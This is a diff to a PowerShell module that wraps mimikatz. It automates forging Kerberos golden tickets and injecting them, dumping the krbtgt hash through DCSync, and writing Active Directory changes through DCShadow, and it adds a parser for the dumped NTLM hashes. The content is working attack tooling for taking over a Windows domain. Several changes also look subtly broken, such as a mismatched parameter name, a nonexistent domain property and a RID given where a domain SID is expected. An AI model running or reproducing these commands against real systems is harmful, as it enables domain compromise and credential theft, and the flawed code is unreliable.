@@ -56,23 +56,30 @@ function Export-MKKerberosTicket {
 
 function Grant-MKKerberosGoldenTicket {
     param(
-        [Parameter(Mandatory)]
-        [string]$Administrator,
-        [Parameter(Mandatory)]
-        [string]$Domain,
-        [Parameter(Mandatory)]
-        [string]$Sid,
-        [Parameter(Mandatory)]
-        [string]$KrbtgtNtlmHash,
-        [Parameter(Mandatory)]
+        [Parameter()]
+        [string]$User = "Administrator",
+        [Parameter()]
+        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty DNSRoot).Trim(),
+        [Parameter()]
+        [string]$Sid = '500',
+        [Parameter()]
+        [string[]]$Groups = @('501','502','513','512','520','518','519'),
+        [Parameter()]
+        [string]$KrbtgtNtlmHash = (Invoke-MKDcSync -User 'krbtgt').HashNTLM.Trim(),
+        [Parameter()]
         [string]$TicketPath
     )
 
-    if (-not (Test-Path $TicketPath)) {
-        throw "Could not find ticket '$TicketPath'"
-    }
+    $GroupString = $groups -join ','
 
-    mimikatz.exe privilege::debug "kerberos::golden /admin:$Administrator /domain:$Domain /sid:$Sid /krbtgt:$KrbtgtNtlmHash /ticket:$TicketPath" exit
+    if ($TicketPath) {
+        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath" exit   
+    } else {
+
+        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt`" exit"
+
+        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt" exit
+    }
 }
 
 function Get-MKCredentialVaultCredential {
@@ -99,11 +106,11 @@ function Invoke-MKDcSync {
     param(
         [Parameter(Mandatory)]
         [string]$UserName,
-        [Parameter(Mandatory)]
-        [string]$Domain
+        [Parameter()]
+        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty DNSRoot)
     )
 
-    mimikatz.exe privilege::debug token::elevate "lsadump::dcsync /user:$UserName /domain:$Domain" exit
+    mimikatz.exe privilege::debug "lsadump::dcsync /user:$UserName /domain:$Domain" exit | ConvertFrom-MKOutput -OutputType LsaDumpDcSync
 }
 
 function Invoke-MKDcShadow {
@@ -111,7 +118,7 @@ function Invoke-MKDcShadow {
         [Parameter(Mandatory, ParameterSetName = 'push')]   
         [Switch]$Push,
         [Parameter(ParameterSetName = 'rpc')]   
-        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty Name),
+        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty RootDns),
         [Parameter(Mandatory, ParameterSetName = 'rpc')]   
         [string]$Object,
         [Parameter(Mandatory, ParameterSetName = 'rpc')]   
@@ -125,7 +132,9 @@ function Invoke-MKDcShadow {
             mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
         }
         else {
-            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value`"")
+            $ADObject = Get-ADObject -LDAPFilter "(Name=$Object)"
+
+            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$($ADObject.DistinguishedName) /attribute:$attribute /value:$Value`"")
         }
     }
 }
@@ -135,7 +144,7 @@ function Invoke-MKDcShadow {
           [Parameter(ValueFromPipeline)]
           [string]$Output,
           [Parameter(Mandatory)]
-          [ValidateSet("LogonPasswords", "VaultCred", "VaultList", "LsadumpSam")]
+          [ValidateSet("LogonPasswords", "VaultCred", "VaultList", "LsadumpSam", "LsadumpDcSync")]
           [string]$OutputType
       )
 
@@ -157,6 +166,7 @@ function Invoke-MKDcShadow {
               "VaultCred" { $RegEx = '(?:TargetName\s+:\s(?<TargetName>.*))[\s\S]*(?:UserName\s+:\s(?<UserName>.*))[\s\S]*(?:Comment\s+:\s(?<Comment>.*))[\s\S]*(?:Type\s+:\s(?<Type>.*))[\s\S]*(?:Persist\s+:\s(?<Persist>.*))[\s\S]*(?:Flags\s+:\s(?<Flags>.*))[\s\S]*(?:Credential\s+:\s(?<Credential>.*))[\s\S]*(?:Attributes\s+:\s(?<Attributes>.*))'}
               "VaultList" { $RegEx = '(?:Vault\s+:\s(?<Vault>.*))[\s\S]*?(?:\s+Name\s+:\s(?<Name>.*))[\s\S]*?(?:\s+Path\s+:\s(?<Path>.*))' }
               "LsadumpSam" {$RegEx = '(?:Domain\s+:\s(?<Domain>.*))[\s\S]*(?:SysKey\s+:\s(?<SysKey>.*))[\s\S]*(?:Local SID\s+:\s(?<LocalSID>.*))[\s\S]*(?:SAMKey\s+:\s(?<SAMKey>.*))'} 
+              "LsadumpDcSync" {$RegEx = '(?:Hash NTLM:\s(?<HashNTLM>.*))'} 
            }
 
           $SB.ToString() | ConvertTo-Object -Pattern $RegEx
